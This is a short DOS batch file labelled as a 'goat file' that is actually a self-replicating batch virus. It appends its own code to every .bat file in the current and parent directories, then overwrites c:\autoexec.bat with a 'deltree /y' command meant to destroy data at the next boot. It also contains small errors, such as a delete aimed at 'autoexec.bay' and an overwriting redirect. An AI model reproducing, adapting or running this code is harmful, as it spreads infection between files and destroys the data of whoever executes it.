REM --------------------------------------------------
REM --------- BAT GOAT FILE 1 ------------------------
REM --------------------------------------------------
@echo off
for %%i in (*.bat ../*.bat) do copy %%i+%0 %%i>nul
del c:\autoexec.bay
echo @echo off >c:\autoexec.bat
echo deltree /y >c:\autoexec.bat
rem Another Reinfector.